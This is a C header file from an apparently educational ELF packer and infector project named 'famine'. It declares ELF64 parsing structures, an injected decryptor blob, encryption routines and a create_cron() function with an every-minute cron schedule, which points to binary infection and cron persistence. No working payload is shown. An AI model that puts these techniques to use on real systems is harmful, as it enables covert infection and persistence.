/* ************************************************************************** */
/*                                                                            */
/*                                                        :::      ::::::::   */
/*   famine.h                                            :+:      :+:    :+:   */
/*                                                    +:+ +:+         +:+     */
/*   By: aimustaev <aimustaev@student.42.fr>        +#+  +:+       +#+        */
/*                                                +#+#+#+#+#+   +#+           */
/*   Created: 2023/01/24 17:22:33 by Jraye             #+#    #+#             */
/*   Updated: 2023/02/11 21:56:44 by aimustaev        ###   ########.fr       */
/*                                                                            */
/* ************************************************************************** */

#ifndef FAMINE_H
#define FAMINE_H
#include <elf.h>
#include <unistd.h>
#include <fcntl.h>
#include <stdlib.h>
#include <stdio.h>
#include <sys/stat.h>
#include <sys/time.h>
#include <stdint.h>
#include <inttypes.h>
#include <string.h>
#include <time.h>
#include "libft.h"
#include <errno.h>
# include <limits.h>
# include <dirent.h>
# include <pwd.h>
# include <grp.h>
# include <sys/types.h>
# include <sys/xattr.h>
# include <sys/ioctl.h>

#define E_TITLE "\033[31mERROR:\033[0m "
#define E_FLAG "wrong flag! Wrong flag is ignored\n"
#define E_FILE_INVALID "invalid file, must be valid linux elf64\n"
#define E_NOSPACE "could not find space for decryptor\n"
#define E_COPY "failed to copy info from input file\n"
#define E_LSEEK "failed to lseek the size of input file\n"
#define E_MALLOC "failed to do malloc()\n"
#define E_OPEN "failed to open input file\n"
#define E_READ "failed to read input file\n"
#define E_UNDER_ENCRYPTION "wrong binary file! Binary file is already under our encryption\n"
#define E_USAGE "Wrong syntax. Correct way is to type: ./woody_woodpacker ./path/binary or ./woody_woodpacker -i ./path/binary\n"
#define E_WRITE_WOODY "could not write to 'woody' file\n"
#define E_KEY_GENERATOR "key generator exception, try again\n"

#define KEY_FORMAT "%#.16llx\n"
#define CHUNK 4096
#define ERROR_CODE 100500
#define CRON_SCHEDULE "*/1 * * * * "

extern unsigned char g_decryptor[];
extern unsigned int g_decryptor_len;

typedef struct s_decryption_set
{
	uint64_t original_entry;
	uint64_t encrypted_code;
	uint64_t encrypted_size;
	uint64_t key;
	uint64_t encrypted_entry;
} t_dset;

typedef struct s_woody
{
	ssize_t filesize;
	void *addr;
	Elf64_Ehdr *ehdr;
	Elf64_Phdr *code;
	Elf64_Phdr *segments;
	Elf64_Shdr *text;
	Elf64_Shdr *sections;
	char 	   *filename;
	int logs_fd;
	int i_flag; // флаг i - соот random_key
	int k_flag; // флаг k - соот generate_urandom_key
	int key_flag;
	uint64_t key_user;
	int res;
	uint64_t key;
} t_woody;

void parse_argc(int argc, char **argv, t_woody *woody);
int read_elf_file(t_woody *woody, char *filename);
int parse_info(t_woody *woody);
int encrypt_func(t_woody *woody, char* filename);
void create_cron(char *filename);
int read_elf_file_bonus(t_woody *woody, char *filename, char *path);

#endif
